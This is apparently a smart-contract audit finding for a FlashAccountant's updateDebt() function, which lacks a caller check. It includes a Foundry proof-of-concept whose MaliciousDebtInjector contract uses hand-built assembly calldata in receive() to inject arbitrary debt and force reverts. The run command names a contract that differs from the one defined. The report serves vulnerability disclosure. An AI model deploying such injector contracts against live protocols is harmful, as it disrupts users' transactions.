  "body": "Summary\n\nComponent\nsrc/base/FlashAccountant.sol – updateDebt()\n\nIssue\n\nupdateDebt() uses _getLocker() instead of _requireLocker() to obtain the active lock.\n_getLocker() only checks that a lock is active.\n_requireLocker() additionally enforces that msg.sender is the current locker.\n\nBecause updateDebt() is external and only uses _getLocker(), any contract that is called while a lock is active can invoke updateDebt() and inject arbitrary debt for the current lock, even though it is not the locker.\n\nOne concrete and realistic path is through native ETH withdrawals: when a locker calls withdraw() with the native token and a recipient address, the FlashAccountant does a low-level call to that recipient. If the recipient is a contract with a receive() function, that receive() runs while the lock is still active and can call updateDebt().\n\nInjected debt increments the per-lock non-zero debt counter, so when the lock completes, the final DebtsNotZeroed check fails and the whole operation reverts.\n\nImpact\n\nA malicious ETH recipient contract can force any lock that pays it ETH to revert, creating a deterministic DoS for those transactions.\n\nThe attacker can:\nInject arbitrary debt values for their own “token” (their contract address).\nCause the lock to always fail its DebtsNotZeroed invariant at the end of execution.\nFunds are not stolen because the entire transaction reverts, but protocol liveness for affected flows is broken.\n\nCurrent reachability you demonstrate in the PoC:\nThe victim/locker chooses a recipient address (e.g. for a withdrawal/refund).\nIf that recipient is a malicious contract, it can:\n\nReceive ETH,\nCall updateDebt() inside receive(),\nBrick the transaction with DebtsNotZeroed.\n\nBecause all ETH recipients in the existing code paths are user-controlled, this is currently a self-DoS / griefing of one’s own operation, not cross-user griefing.\n\nRisk level:\n\nTechnical bug: clear authorization failure in a core accountant component.\n\nImpact today: per-transaction DoS of flows where the user points an operation at a malicious recipient → Medium by typical C4 standards.\n\nRoot Cause\n\nIn FlashAccountant.updateDebt():\nThe function uses _getLocker():\n\nfunction updateDebt() external {\n    if (msg.data.length != 20) revert UpdateDebtMessageLength();\n\n    // Only checks \"there is an active lock\"\n    uint256 id = _getLocker().id();  // <-- no msg.sender == locker check\n\n    // parse delta from calldata and account it as debt for msg.sender (token)\n    _accountDebt(id, msg.sender, delta);\n}\n\n\n_getLocker() only ensures a lock exists; it does not verify that the caller is the current locker.\n\nBy contrast, other public entrypoints that mutate debt (e.g. withdraw()) use _requireLocker(), which does:\n\nfunction _requireLocker() internal view returns (Locker locker) {\n    locker = _getLocker();\n    if (locker.addr() != msg.sender) revert LockerOnly();  // proper auth check\n}\n\n\nThis inconsistency means that updateDebt() is the only debt-mutating public interface that does not enforce msg.sender == locker.addr().\n\nAs a result, any contract executed during an active lock (e.g. ETH recipient in receive()) can:\n\nCall updateDebt().\nPass _getLocker() because a lock is active.\nModify the lock’s debt for the “token” equal to its own address (msg.sender).\n\nThe fake debt increments the lock’s non-zero debt counter, which is checked at the end of the lock, causing DebtsNotZeroed and reverting the entire transaction.",
  "proof_of_concept": "```\n// SPDX-License-Identifier: ekubo-license-v1.eth\npragma solidity >=0.8.30;\n\nimport {FullTest} from \"./FullTest.sol\";\nimport {BaseLocker} from \"../src/base/BaseLocker.sol\";\nimport {IFlashAccountant} from \"../src/interfaces/IFlashAccountant.sol\";\nimport \"forge-std/console.sol\";\n\n/**\n * @title FlashAccountant_UpdateDebt_Authorization_Bypass_PoC\n * @notice Demonstrates that updateDebt() allows unauthorized debt injection\n *         from any contract invoked during an active lock (e.g., ETH recipient),\n *         causing deterministic DebtsNotZeroed() reverts.\n *\n * ROOT CAUSE:\n * - updateDebt() uses _getLocker() instead of _requireLocker()\n * - _getLocker() only checks that a lock is active, not that msg.sender == locker\n *\n * IMPACT:\n * - Any ETH recipient can inject arbitrary debt during lock execution\n * - Lock always fails exit due to non-zero debt → deterministic DoS\n */\ncontract FlashAccountant_UpdateDebt_Authorization_Bypass_PoC is FullTest {\n    AuthorizedLocker public victimLocker;\n    MaliciousDebtInjector public maliciousRecipient;\n\n    function setUp() public override {\n        FullTest.setUp();\n        victimLocker = new AuthorizedLocker(core);\n        maliciousRecipient = new MaliciousDebtInjector(core);\n        vm.deal(address(victimLocker), 10 ether); // fund the locker\n    }\n\n    function coolAllContracts() internal virtual override {\n        FullTest.coolAllContracts();\n        vm.cool(address(victimLocker));\n        vm.cool(address(maliciousRecipient));\n    }\n\n    /**\n     * @notice Demonstrates full attack path via ETH withdrawal.\n     */\n    function test_Authorization_Bypass_DoS() public {\n        maliciousRecipient.enableInjection(true);\n        maliciousRecipient.setInjectedDebt(1000 ether);\n\n        vm.expectRevert(); // DebtsNotZeroed\n        victimLocker.executeWithdrawal(address(maliciousRecipient), 1 ether);\n    }\n\n    /**\n     * @notice Attacker can inject any arbitrary debt value.\n     */\n    function test_Arbitrary_Debt_Injection() public {\n        uint256[3] memory testValues = [\n            uint256(1 ether),\n            uint256(1000 ether),\n            uint256(type(uint128).max)\n        ];\n\n        for (uint256 i = 0; i < testValues.length; i++) {\n            maliciousRecipient.enableInjection(true);\n            maliciousRecipient.setInjectedDebt(testValues[i]);\n\n            vm.expectRevert(); // DebtsNotZeroed\n            victimLocker.executeWithdrawal(address(maliciousRecipient), 1 ether);\n\n            maliciousRecipient.enableInjection(false);\n        }\n    }\n\n    /**\n     * @notice Demonstrates that updateDebt() is missing proper authorization.\n     */\n    function test_Missing_Authorization() public {\n        maliciousRecipient.enableInjection(true);\n        maliciousRecipient.setInjectedDebt(50 ether);\n\n        vm.expectRevert(); // DebtsNotZeroed\n        victimLocker.executeWithdrawal(address(maliciousRecipient), 1 ether);\n    }\n}\n\n/**\n * @title AuthorizedLocker\n * @notice Honest locker contract initiating a lock and performing withdrawals.\n */\ncontract AuthorizedLocker is BaseLocker {\n    constructor(IFlashAccountant accountant) BaseLocker(accountant) {}\n\n    function executeWithdrawal(address recipient, uint256 amount) external {\n        lock(abi.encode(recipient, amount));\n    }\n\n    function handleLockData(uint256, bytes memory data)\n        internal\n        override\n        returns (bytes memory)\n    {\n        (address recipient, uint256 amount) = abi.decode(data, (address, uint256));\n\n        // Fund the accountant (creates negative debt)\n        (bool depositSuccess,) = address(ACCOUNTANT).call{value: 2 ether}(\"\");\n        require(depositSuccess, \"Deposit failed\");\n\n        // Build withdraw() ABI-encoded call:\n        // selector (4) + token (20) + recipient (20) + amount (16)\n        bytes memory withdrawCall = abi.encodePacked(\n            bytes4(keccak256(\"withdraw()\")),\n            bytes20(address(0)),              // native token = ETH\n            bytes20(recipient),               // ETH recipient\n            bytes16(uint128(amount))\n        );\n\n        // This triggers maliciousRecipient.receive()\n        (bool ok,) = address(ACCOUNTANT).call(withdrawCall);\n        require(ok, \"Withdraw failed\");\n\n        return bytes(\"\");\n    }\n}\n\n/**\n * @title MaliciousDebtInjector\n * @notice ETH recipient that abuses updateDebt() to inject arbitrary debt.\n */\ncontract MaliciousDebtInjector {\n    IFlashAccountant public accountant;\n    bool public injectionEnabled;\n    uint256 public injectedDebt;\n\n    constructor(IFlashAccountant _accountant) {\n        accountant = _accountant;\n    }\n\n    function enableInjection(bool enabled) external {\n        injectionEnabled = enabled;\n    }\n\n    function setInjectedDebt(uint256 amount) external {\n        injectedDebt = amount;\n    }\n\n    /**\n     * @notice Triggered when receiving ETH during withdraw().\n     * @dev Calls updateDebt() with attacker-controlled delta.\n     */\n    receive() external payable {\n        if (!injectionEnabled) return;\n\n        address accountantAddr = address(accountant);\n        uint256 debt = injectedDebt;\n        bool success;\n\n        // Manually craft calldata: updateDebt() selector + int128 delta\n        assembly {\n            let ptr := mload(0x40)\n            mstore(ptr, 0x17c5da6a00000000000000000000000000000000000000000000000000000000) // updateDebt() selector\n            mstore(add(ptr, 4), shl(128, debt)) // encoded delta in upper 128 bits\n            success := call(gas(), accountantAddr, 0, ptr, 20, 0, 0)\n        }\n\n        require(success, \"updateDebt injection failed\");\n    }\n}\n\n```\n\nHow to run\nbash\nCopy code\nforge test --match-contract UpdateDebt_DoS_PoC_REAL -vv\nExpected: All tests revert as expected due to attacker-injected debt.",
